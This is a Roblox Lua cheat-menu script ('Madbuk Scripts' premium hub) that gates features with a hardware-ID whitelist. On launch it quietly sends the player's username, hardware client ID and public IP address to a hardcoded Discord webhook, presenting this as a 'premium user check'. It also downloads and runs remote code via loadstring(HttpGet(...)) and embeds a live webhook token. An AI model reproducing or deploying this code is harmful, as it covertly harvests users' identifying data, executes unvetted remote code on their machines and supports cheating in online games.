HttpService = game:GetService("HttpService")
input = "https://discord.com/api/webhooks/1126592029351215285/ymz7i9lq9AxWsTmtgXX9tTsj7aM2JEQ5vyUFtKazIBjJZg7ZcE0iNabYq47qngvO9OZD"


local responce = request(
        
    {
        Url = input,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = HttpService:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "**PREMIUM USER CHECK**",
                ["description"] = game.Players.LocalPlayer.DisplayName.." (@"..game.Players.LocalPlayer.Name..")",
                ["type"] = "rich",
                ["color"] = 16711782,
                ["fields"] = {
                    {
                        ["name"] = "**HWID**",
                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = game:GetService'HttpService':JSONDecode(game:HttpGet("http://ip-api.com/json")).query,
                        ["inline"] = true
                    }
                }
            }}
        })

    }
    )

Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

function correctHwid()
    Rayfield:Destroy()
    Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()Window = Rayfield:CreateWindow({
    Name = "Premium Script Hub",
    LoadingTitle = "Madbuk Scripts",
    LoadingSubtitle = "by Madbuk Scripts",
    ConfigurationSaving = {
       Enabled = false,
       FolderName = "MadbukHub", -- Create a custom folder for your hub/game
       FileName = "MadbukHub"
    },
    Discord = {
       Enabled = false,
       Invite = "madbuk",
       RememberJoins = false -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = false, -- Set this to true to use our key system
    KeySettings = {
       Title = "Premium Key Check",
       Subtitle = "Key System",
       Note = "Key in the premium-scripts channel",
       FileName = "MadbukKey", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"MadbukOnTop"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
EveryGame = {"14175228555","14185839068","11430498851","12794951887", "11708967881","12878201066","11402943018","11713882653", "12945111724", "11713882653","11658616007", "12945702551", "12819767752", "13372766854", "13249403986", "13376216053", "13205133454", "12215278065", "11708967881", "12992876175", "12848696569"}
Tab = Window:CreateTab("Games", 4483362458)
Section = Tab:CreateSection("Games List")
Label = Tab:CreateLabel("You are a premium user, Welcome "..game.Players.LocalPlayer.Name)
Label1 = Tab:CreateLabel("placeholder")

    if game.PlaceId == 12848696569 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 12992876175 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 11708967881 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 12215278065 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 13205133454 then
         Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 13376216053 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 13249403986 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 11430498851 then
        Label1:Set("Your Game Is Supported")       
    elseif game.PlaceId == 13372766854 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 11713882653 then
        Label1:Set("Your Game Is Supported")  
    elseif game.PlaceId == 12819767752 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 14185839068 then
        Label1:Set("Your Game Is Supported")      
    elseif game.PlaceId == 12945702551 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 14175228555 then
        Label1:Set("Your Game Is Supported")  
    elseif game.PlaceId == 11713882653 then
        Label1:Set("Your Game Is Supported") 
    elseif game.PlaceId == 12945111724 then
        Label1:Set("Your Game Is Supported") 
    elseif game.PlaceId == 11402943018 then
        Label1:Set("Your Game Is Supported") 
    elseif game.PlaceId == 11658616007 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 12794951887 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 12878201066 then
        Label1:Set("Your Game Is Supported")
    elseif game.PlaceId == 11708967881 then
        Label1:Set("Your Game Is Supported") 
    else 
        Label1:Set("Your Game Is Not Supported")
    end


Button1 = Tab:CreateButton({
    Name = "Load script for "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MadbukScripts/ScriptHub/main/ScriptHub"))()
    end,
 })

 Tab = Window:CreateTab("Games List", 4483362458)

 for _,v in next, EveryGame do
    if v ~= "14175228555" then
        if v ~= "14185839068" then
    Button1 = Tab:CreateButton({
        Name = "Join the game: "..game:GetService("MarketplaceService"):GetProductInfo(v).Name,
        Callback = function()
            game:GetService("TeleportService"):Teleport(v)
        end,
     })
    end
    end
 end
end

function notHwid()
Window = Rayfield:CreateWindow({
        Name = "Premium Script Hub",
    LoadingTitle = "Madbuk Scripts",
    LoadingSubtitle = "by Madbuk Scripts",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = "MadbukHub", -- Create a custom folder for your hub/game
        FileName = "MadbukHub"
     },
        Discord = {
        Enabled = false,
        Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
        RememberJoins = true -- Set this to false to make them join the discord every time they load it up
        },
        KeySystem = false, -- Set this to true to use our key system
        KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
        SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
        Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
        }
    })

Tab = Window:CreateTab("Not Premium", 4483362458)

Section = Tab:CreateSection("Not Premium")

Label = Tab:CreateLabel("You are not a premium user.")

Label = Tab:CreateLabel("If you are then DM thanhtam8765 or jakub your hwid ID so i can whitelist you.")

Label = Tab:CreateLabel("To Find you hwid ID simply click the button below")

hwidlabel = Tab:CreateLabel("hwid: "..game:GetService("RbxAnalyticsService"):GetClientId())

    Button = Tab:CreateButton({
            Name = "Copy hwid",
            Callback = function()
                setclipboard(game:GetService("RbxAnalyticsService"):GetClientId())  
            end,
         })

    




end

whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/MadbukScripts/ScriptHub/main/hwidlist.lua"))()
hwid = game:GetService("RbxAnalyticsService"):GetClientId()

for _,v in next, whitelist do
    if hwid == v then
        getgenv().ishaving = true
        correctHwid()
    elseif hwid ~= v and getgenv().ishaving == false then
        notHwid()
    end
end